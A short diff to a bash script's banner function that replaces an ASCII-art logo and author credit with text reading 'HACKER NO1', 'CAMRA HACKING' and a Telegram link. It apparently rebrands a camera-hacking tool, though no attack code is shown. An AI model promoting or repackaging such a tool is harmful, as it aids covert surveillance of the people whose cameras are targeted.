@@ -8,14 +8,14 @@ trap 'printf "\n";stop' 2
 banner() {
 
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
+printf "\e[1;92m HACKER NO1|\e[0m\e[1;77m WELCOME TO!!                      \e[0m\n"
+printf "\e[1;92m HACKER NO1|\e[0m\e[1;77m https://t.me/TERMUXHACKMAX \e[0m\n"
+printf "\e[1;92m HACKER NO1|\e[0m\e[1;77m THIS IS\e[0m\n"
+printf "\e[1;92m HACKER NO1|\e[0m\e[1;77m CAMRA HACKING  \e[0m\n"
+printf "\e[1;92m HACKER NO1|\e[0m\e[1;77m CAMRA HACKING \e[0m\n"
+printf "\e[1;92m HACKER NO1|\e[0m                                  \n"
 
-printf " \e[1;77m v1.0 coded by ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ\e[0m \n"
+printf " \e[1;77m v1.0 BROUGHT TO YOU BY :『𓆩 Ⱨ₳₵₭ɆⱤ_₦Ø1 𓆪』 \e[0m \n"
 
 printf "\n"
 
